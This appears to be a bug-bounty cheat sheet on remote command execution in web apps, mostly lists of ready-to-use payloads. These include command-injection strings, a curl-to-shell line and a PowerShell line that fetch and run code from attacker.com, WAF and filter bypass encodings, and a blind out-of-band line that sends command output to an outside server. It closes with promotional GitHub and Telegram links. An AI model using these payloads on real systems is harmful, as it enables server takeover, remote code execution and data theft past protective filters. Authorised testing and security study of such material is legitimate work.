## 🚨 Remote Code Execution (RCE) — Payloads, Bypasses & Real-World Tips
> RCE is one of the most critical vulnerabilities in web apps — allowing attackers to run arbitrary commands on the server. Here’s how to hunt it, bypass filters, and exploit it effectively.

### ✅ Where to Look:

**🔹 Common vulnerable parameters:**

`cmd=` , `exec=` , `ping=` , `ip=` , `host=` , `url=` , `path=` , `file=` , `log=`

Anything passed to system functions : system(), exec(), popen(), etc.

🔹 Dangerous endpoints:
`/admin` , `/tools/` , `/debug/` , `/run` , `/test` , `/shell`

### 💥 Payload Examples (Linux):
```
;whoami
|id
&uname -a
$(whoami)
`id`
|| ls -la
; curl attacker.com | sh
```


**Windows Payloads:**
```
& whoami
| powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
```

### 🛡 Bypass Filters & WAF Tricks:

**Command Obfuscation:**
```
$(wh\oami)
`i$IFS$d`
whoami%00
```

**Double Encoding:**
```
%2526id
%26%26whoami
```
**Environment Injection:**
```
${run{whoami}}
${@system('id')}
```
URL Encoded Pipes:
```
%7C%7Cls
%26%26whoami
```

#### 🧠 Advanced Tips:
🔍 Use Burp Intruder to fuzz for RCE across multiple parameters
🧬 Combine with LFI to achieve RCE via log poisoning
🔁 Test for blind RCE using out-of-band payloads (webhook.site)

;curl http://<your-server>/?x=$(whoami)

🚩 What to Report:
- Full command execution
- Blind RCE (e.g., ping or DNS callback)
- RCE chained with upload, LFI, or SSRF
- Bypasses that work on protected endpoints

🔔 Stay sharp. Test responsibly. Report ethically.

🔗 Payload List : [Github.com](https://github.com/cybersecplayground/bugbounty-Tips-and-Tricks/blob/main/Payloads/rce_payloads.txt)

📡 For more payloads, recon tools, and real hunting tips, join our Telegram: 👉 [@cybersecplayground
](https://t.me/cybersecplayground)
👍 Star & Share to help fellow hunters.

> #bugbounty #rce #payloads #infosec #cybersecurity #ethicalhacking #hackingtips #websecurity
